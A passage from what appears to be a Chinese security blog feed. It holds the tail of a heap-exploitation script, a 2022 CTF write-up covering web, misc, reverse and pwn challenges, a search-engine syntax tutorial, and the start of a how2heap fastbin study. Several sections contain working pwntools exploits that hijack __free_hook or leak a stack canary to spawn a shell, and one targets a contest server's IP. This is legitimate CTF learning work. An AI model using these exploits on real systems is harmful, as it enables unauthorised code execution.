class="number">129</span>,<span class="string">''</span>,<span class="number">800</span>,<span class="string">'1'</span>*<span class="number">6</span>, p64( <span class="number">0x4f0</span>) + p64(<span class="number">0xb0</span>))<span class="comment">#5</span></span><br><span class="line">add(<span class="number">129</span>,<span class="string">''</span>,<span class="number">800</span>,<span class="string">'1'</span>*<span class="number">6</span>, p64( <span class="number">0x4f0</span>) + p64(<span class="number">0xb0</span>))<span class="comment">#6</span></span><br><span class="line">free(<span class="number">0</span>,<span class="string">'1'</span>*<span class="number">6</span>)</span><br><span class="line">free(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>,<span class="string">'1'</span>*<span class="number">6</span>)</span><br><span class="line">free(<span class="number">3</span>,<span class="string">'1'</span>*<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x420</span>,<span class="string">''</span>,<span class="number">800</span>,<span class="string">'1'</span>*<span class="number">6</span>,<span class="string">'x'</span>*(<span class="number">0x400</span><span class="number">-1</span>))</span><br><span class="line"><span class="comment">#add(0x200,'lexs','1'*7,'','x'*(0x200-1))</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0</span>,<span class="string">'x'</span>*<span class="number">6</span>)</span><br><span class="line">p.recv()</span><br><span class="line">show(<span class="number">3</span>,<span class="string">'x'</span>*<span class="number">6</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Your info:'</span>)</span><br><span class="line">addr= u64(p.recvuntil(<span class="string">'\x7f'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">'base_addr:'</span>+hex(addr))</span><br><span class="line">main_arena_addr=addr<span class="number">-96</span></span><br><span class="line">log.info(<span class="string">'main_arena_addr:'</span>+hex(main_arena_addr))</span><br><span class="line">__malloc_hook_addr=main_arena_addr<span class="number">-0x10</span></span><br><span class="line">log.info(<span class="string">'__malloc_hook_addr:'</span>+hex(__malloc_hook_addr))</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0</span>,p64( <span class="number">0x411</span>+<span class="number">0xb0</span>+<span class="number">0x30</span>)[:<span class="number">-1</span>])</span><br><span class="line">x=finder(<span class="string">'__malloc_hook'</span>,__malloc_hook_addr,num=<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>,<span class="string">'1'</span>*<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4c0</span><span class="number">-0x20</span>,<span class="string">''</span>,<span class="number">0</span>,<span class="string">'1'</span>*<span class="number">6</span>,<span class="string">'y'</span>*<span class="number">0x3e0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xb0</span>)+p64(x.dump(<span class="string">'__free_hook'</span>))+p64(<span class="number">0</span>))<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">''</span>,<span class="number">800</span>,<span class="string">'1'</span>*<span class="number">6</span>, <span class="string">'x'</span>*(<span class="number">0x8</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x88</span>,p64(x.dump(<span class="string">'system'</span>)),<span class="number">800</span>,<span class="string">'1'</span>*<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">3</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'/bin/sh\x00'</span>,<span class="number">800</span>,<span class="string">'1'</span>*<span class="number">6</span>, <span class="string">'x'</span>*(<span class="number">0x8</span>))<span class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span>,<span class="string">'1'</span>*<span class="number">6</span>)</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022川渝个人赛-wp</title>
      <link href="/2022/09/14/%E5%B7%9D%E6%B8%9D%E4%B8%AA%E4%BA%BA%E8%B5%9B-wp/"/>
      <url>/2022/09/14/%E5%B7%9D%E6%B8%9D%E4%B8%AA%E4%BA%BA%E8%B5%9B-wp/</url>
      
        <content type="html"><![CDATA[<p>这个比赛简单，但是好久没有打ctf,感觉自己变废了<a id="more"></a></p><h2 id="解题情况"><a href="#解题情况" class="headerlink" title="解题情况"></a>解题情况</h2><p><img src="%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220914163354.png" alt="微信截图_20220914163354"></p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="1-1-目录扫描"><a href="#1-1-目录扫描" class="headerlink" title="1-1 目录扫描"></a>1-1 目录扫描</h4><p>按照经验，猜测robots.txt文件。读取后发现提示<code>&#39;/Sec3et_in_h3r3/fl6g</code></p><p><img src="%E5%B7%9D%E6%B8%9D%E4%B8%AA%E4%BA%BA%E8%B5%9B-wp.assets/0f71dfc995cba4c7e397f8863a1d069.jpg" alt="0f71dfc995cba4c7e397f8863a1d069"></p><p>读取后发现flag。</p><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="2-3-0101"><a href="#2-3-0101" class="headerlink" title="2-3 0101"></a>2-3 0101</h4><p>打开文本发现16进制数，用winhex写入，然后根据附件开头<code>50 4B 03 04 14 00 00 00 00 00</code> 判断文件为zip,且文件头损坏而打不开，因此修改<code>为50 4B 03 04 14 00 00 00 08 00</code>.在打开压缩包解压。发现一组黑白图片。编写脚本将黑色图片识别为1，将白色图片识别为0，将得到的二进制数转为字符从而得到flag</p><p><img src="image-20220914164829072.png" alt="image-20220914164829072"></p><p>识别脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   1.py</span></span><br><span class="line"><span class="string">@Time    :   2022/09/14 14:29:19</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">result= <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">304</span>):</span><br><span class="line">    img = Image.open(<span class="string">f"<span class="subst">&#123;i&#125;</span>.png"</span>)</span><br><span class="line">    im_RGB = img.convert(<span class="string">"RGB"</span>) <span class="comment"># 将图片转换为RGB模式</span></span><br><span class="line">    r,g,b =im_RGB.getpixel((<span class="number">1</span>,<span class="number">1</span>)) <span class="comment">#获得rgb值</span></span><br><span class="line">    print(r,g,b)<span class="comment"># 白色rgb值:(255,255,255)</span></span><br><span class="line">    <span class="keyword">if</span> r !=<span class="number">255</span>: <span class="comment">#255是白色</span></span><br><span class="line">        result +=<span class="string">"1"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result +=<span class="string">"0"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将二进制转换为ascii码</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(result),<span class="number">8</span>):</span><br><span class="line">    byte = result[i:i+<span class="number">8</span>]</span><br><span class="line">    print(chr(int(byte,<span class="number">2</span>)),end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure><h3 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h3><h4 id="4-1-simple-dispy"><a href="#4-1-simple-dispy" class="headerlink" title="4-1 simple dispy"></a>4-1 simple dispy</h4><p>跟着文档手搓python字节码。大致还原python 源代码为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">arr=[<span class="number">47378</span>,<span class="number">29475</span>,<span class="number">46200</span>,<span class="number">39869</span>,<span class="number">67243</span>,<span class="number">68695</span>,<span class="number">73129</span>,<span class="number">27171</span>,<span class="number">53832</span>,<span class="number">30653</span>,<span class="number">60541</span>,<span class="number">67276</span>,<span class="number">58816</span>,<span class="number">63571</span>,<span class="number">50131</span>,<span class="number">34471</span>,<span class="number">67922</span>,<span class="number">82293</span>,<span class="number">33259</span>,<span class="number">67538</span>,<span class="number">57810</span>,<span class="number">50339</span>,<span class="number">34632</span>,<span class="number">68754</span>,<span class="number">83192</span>,<span class="number">36077</span>,<span class="number">60424</span>,<span class="number">54547</span>,<span class="number">56308</span>,<span class="number">33565</span>,<span class="number">69425</span>,<span class="number">84024</span>]</span><br><span class="line"></span><br><span class="line">k=<span class="number">22643</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag=input()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    num=ord(flag[i])*<span class="number">255</span>+k</span><br><span class="line">    <span class="keyword">if</span>(num!=arr[i]):</span><br><span class="line">        print(<span class="string">"Error"</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    print(i)</span><br><span class="line">    k=(k+arr[i])&amp;<span class="number">65535</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"Right,the flag is DASCTF&#123;Input&#125;"</span>)</span><br></pre></td></tr></table></figure><p>从而逆向写出脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   t.py</span></span><br><span class="line"><span class="string">@Time    :   2022/09/14 13:26:54</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">arr=[<span class="number">47378</span>,<span class="number">29475</span>,<span class="number">46200</span>,<span class="number">39869</span>,<span class="number">67243</span>,<span class="number">68695</span>,<span class="number">73129</span>,<span class="number">27171</span>,<span class="number">53832</span>,<span class="number">30653</span>,<span class="number">60541</span>,<span class="number">67276</span>,<span class="number">58816</span>,<span class="number">63571</span>,<span class="number">50131</span>,<span class="number">34471</span>,<span class="number">67922</span>,<span class="number">82293</span>,<span class="number">33259</span>,<span class="number">67538</span>,<span class="number">57810</span>,<span class="number">50339</span>,<span class="number">34632</span>,<span class="number">68754</span>,<span class="number">83192</span>,<span class="number">36077</span>,<span class="number">60424</span>,<span class="number">54547</span>,<span class="number">56308</span>,<span class="number">33565</span>,<span class="number">69425</span>,<span class="number">84024</span>]</span><br><span class="line"></span><br><span class="line">k=<span class="number">22643</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">flag=input()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(32):</span></span><br><span class="line"><span class="string">    num=ord(flag[i])*255+k</span></span><br><span class="line"><span class="string">    if(num!=arr[i]):</span></span><br><span class="line"><span class="string">        print("Error")</span></span><br><span class="line"><span class="string">        exit(0)</span></span><br><span class="line"><span class="string">    print(i)</span></span><br><span class="line"><span class="string">    k=(k+arr[i])&amp;65535</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print("Right,the flag is DASCTF&#123;Input&#125;")</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line"> flag+=chr(int((arr[i]-k)/<span class="number">255</span>))</span><br><span class="line"> k=(k+arr[i])%<span class="number">65536</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="5-1-ez-canary"><a href="#5-1-ez-canary" class="headerlink" title="5-1 ez_canary"></a>5-1 ez_canary</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;lexs&#x2F;Desktop&#x2F;pwntest&#x2F;2022&#x2F;cy&#x2F;ez_canary&#x2F;ez_canary&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>题目开了canary 和 nx，但是没开PIE.</p><p>但是通过逆向源代码和动态gdb，可以得知我们的输入的<code>Username</code>可以溢出到栈上，我们输入的password 可以覆盖 <code>Username</code>的同时溢出到栈上。因此，我们合理布局code让<code>Username</code> 刚好把canary低位的’\x00’覆盖，从而泄露出canary。由于PIE未开，我们可以源文件后门，从而在Password 输入合理布局覆盖<code>Username</code>和canary，让程序流跳到我们后门上。（远程不知道为啥打不通，后赖用 ret 调节下栈 ）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2022/09/14 10:21:45</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#from libcfind import *</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">""" </span></span><br><span class="line"><span class="string">0x000000000040142c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040142e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401430 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401432 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040142b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040142f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004011fd : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401433 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000401431 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040142d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040101a : ret</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./ez_canary'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.arch=e.arch</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">ip_port=[<span class="string">'43.143.139.234'</span>,<span class="number">50305</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> gdb_cmd=<span class="string">''</span>: gdb.attach(p,gdb_cmd) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">p.sendline(<span class="string">'x'</span>*<span class="number">0xa</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">cananry=(u64(p.recv(<span class="number">7</span>)+<span class="string">'\x00'</span>))*<span class="number">0x100</span></span><br><span class="line">cd=(u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00'</span>*<span class="number">2</span>))*<span class="number">0x100</span></span><br><span class="line">log.info(hex(cananry))</span><br><span class="line">log.info(hex(cd))</span><br><span class="line"><span class="comment">#print(p.recvuntil('!Password:'))</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">back=<span class="number">0x000000000401216</span></span><br><span class="line">p.sendline(<span class="string">'k'</span>*(<span class="number">0x10</span>+<span class="number">4</span>)+p64(cananry)+p64(ret)*<span class="number">2</span>+p64(back)*<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> pwn </tag>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搜索引擎语法学习</title>
      <link href="/2022/07/26/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/07/26/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>随着互联网的发展，搜索引擎已成为搜集网上信息资料最常用的导航工具。大多数的网络用户们使用搜索引擎时,习惯于“关键词+回车键”的操作方式。这是最简单、最省心的方式,但是,反馈的结果往往伴随着无数的冗余信息,不一定令人满意。<a id="more"></a>应为某任务需要在规定的时间内快速找到在互联网某处存放的某需要信息。但由于百度必应谷歌等存在广告、收费项目、爬虫复读信息的干扰</p><h2 id="基础搜索引擎语法"><a href="#基础搜索引擎语法" class="headerlink" title="基础搜索引擎语法"></a>基础搜索引擎语法</h2><h3 id="Intitle"><a href="#Intitle" class="headerlink" title="Intitle"></a>Intitle</h3><p>搜索在网页标题中的关键字。即把搜索的内容限定到网页(文章)的标题.</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intitle:关键字</span><br></pre></td></tr></table></figure><p>例如：</p><p><img src="image-20220726111422242.png" alt="image-20220726111422242"></p><h3 id="Site"><a href="#Site" class="headerlink" title="Site"></a>Site</h3><p>把搜索范围限定到特点网站中。即只在特点网站中查找内容。</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:域名&#x2F;网址</span><br></pre></td></tr></table></figure><p>例如：</p><p><img src="image-20220726112049243.png" alt="image-20220726112049243"></p><h3 id="Inurl"><a href="#Inurl" class="headerlink" title="Inurl"></a>Inurl</h3><p>搜索在url中含有关键词的网页。返回在url(网址)中含有我们关键的网站。</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:关键词</span><br></pre></td></tr></table></figure><p>例如：</p><p><img src="image-20220726112538893.png" alt="image-20220726112538893"></p><h3 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h3><p>搜索所有链接到关键字的网页。比如说<code>link:baidu.com</code>就返回所有与百度做了链接的url。</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link:url</span><br></pre></td></tr></table></figure><p>例如：</p><p><img src="image-20220726113106807.png" alt="image-20220726113106807"></p><h3 id="Filetype"><a href="#Filetype" class="headerlink" title="Filetype"></a>Filetype</h3><p>搜索指定后缀名的文件。即，搜索引擎返回的内容直接是某指定后缀名的文件而不是网页。</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filetype:type(pdf,txt,jpg,png,mp4......)</span><br></pre></td></tr></table></figure><p>例如：</p><p><img src="image-20220726113802788.png" alt="image-20220726113802788"></p><h3 id="Intext"><a href="#Intext" class="headerlink" title="Intext"></a>Intext</h3><p>搜索在文章内容中包含某关键字的网页。</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intext:关键字</span><br></pre></td></tr></table></figure><p>例如：</p><p><img src="image-20220726162307144.png" alt="image-20220726162307144"></p><h3 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h3><p>提供一个和指定url更多信息的页面列表.</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info:url</span><br></pre></td></tr></table></figure><p>例如：</p><p><img src="image-20220726114955373.png" alt="image-20220726114955373"></p><h2 id="强制搜索"><a href="#强制搜索" class="headerlink" title="强制搜索"></a>强制搜索</h2><p>强制搜索的意思是必须完整出现我所查询的关键字。例如 我强制搜索 “lexsd6，那么搜获引擎必优先返回我 ”<strong>lexsd6</strong>“ 而不是优先返回”d6“或”lexs”的内容。</p><p>强制搜索分为两类：长关键搜索和名称搜索。</p><h3 id="长关键搜索"><a href="#长关键搜索" class="headerlink" title="长关键搜索"></a>长关键搜索</h3><p>主要用于比配过长的关键词，比如说某题目。</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">”关键词“</span><br></pre></td></tr></table></figure><p>未用长关键强制搜索：</p><p><img src="image-20220726150151368.png" alt="image-20220726150151368"></p><p>用长关键强制搜索：</p><p><img src="image-20220726150134573.png" alt="image-20220726150134573"></p><h3 id="名称搜索"><a href="#名称搜索" class="headerlink" title="名称搜索"></a>名称搜索</h3><p>名称搜索，顾名思义是用来搜索作品名称的，用书刊名、歌曲名、文献名来搜索名称的。</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">《关键词》</span><br></pre></td></tr></table></figure><p>未名称搜索：</p><p><img src="image-20220726152126178.png" alt="image-20220726152126178"></p><p>名称搜索：</p><p><img src="image-20220726152058324.png" alt="image-20220726152058324"></p><h2 id="逻辑语法"><a href="#逻辑语法" class="headerlink" title="逻辑语法"></a>逻辑语法</h2><p>在我们使用搜索引擎时，有时候一个关键词并不能满足我们使用需求，要多个关键词同时作用才能达到我们的需求。但是搜索引擎并不会直接明白我们输入关键词的意思，我们要通过一定的<strong>逻辑语法</strong>来告诉搜索引擎，我们输入的各个关键词之间的关系与搜索的目的。</p><h3 id="逻辑与"><a href="#逻辑与" class="headerlink" title="逻辑与"></a>逻辑与</h3><p>表示我们要同时搜索两个关键词或两个以上的关键词的内容。</p><p>例如我们现在有两个关键词A、B，我们要查询同时有A、B关键词的内容。用程序逻辑表达为：A&amp;B。</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A B</span><br></pre></td></tr></table></figure><p>即在两关键词以空格隔开即可。</p><h3 id="逻辑或"><a href="#逻辑或" class="headerlink" title="逻辑或"></a>逻辑或</h3><p>表示我们要搜索至包含两个关键词或两个以上的关键词中至少用一个关键词的内容。</p><p>例如我们现在有两个关键词A、B，我们要查询有A关键词的内容、B关键词的内容即同时有AB关键词的内容。用程序逻辑表达为：A|B。</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A|B</span><br></pre></td></tr></table></figure><p>即在两关键词以<code>&quot;|&quot;</code>隔开即可。</p><h3 id="逻辑非"><a href="#逻辑非" class="headerlink" title="逻辑非"></a>逻辑非</h3><p>表示我们要搜索至包含两个关键词或两个以上的关键词中，有其中一个关键词出现，就没有其它关键的内容。</p><p>例如我们现在有两个关键词A、B，我们要查询有A关键词且没有B关键词的内容、B关键词且没有A关键词的内容。</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A -B</span><br></pre></td></tr></table></figure><p>即在两关键词以<code>&quot; -&quot;</code>隔开即可。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>熟练使用搜索引擎有利于我们快速在网上查找信息，有个于扩大我们知识面和提高我们的办公效率<del>（方便网上测试找题）</del>。</p>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> problem_resolve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>how2heap-fastbin_reverse_into_tcache-学习</title>
      <link href="/2022/06/17/how2heap-fastbin_reverse_into_tcache-%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/06/17/how2heap-fastbin_reverse_into_tcache-%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><code>fastbin reverse into tcache</code>是指利用tcache为空而fastbin不为空，堆管理把fashbin放入tcahe时进行的攻击。<code>fastbin reverse into tcache</code>一度感觉很鸡肋，但仔细看大佬分析后，发现是我态年轻了，理解不到位。<a id="more"></a></p><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>1.让任意地址进入tcache中，再取出tcache进行任意地址写。</p><p>2.对任意一个地址，写入一个可控的堆上地址。</p><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>1.能反复创建释放14个以上的fastbin。</p><p>2.能修改其中一个fastbin的fd</p><p>3.用tcache机制</p><h2 id="分析how2heap源码"><a href="#分析how2heap源码" class="headerlink" title="分析how2heap源码"></a>分析how2heap源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 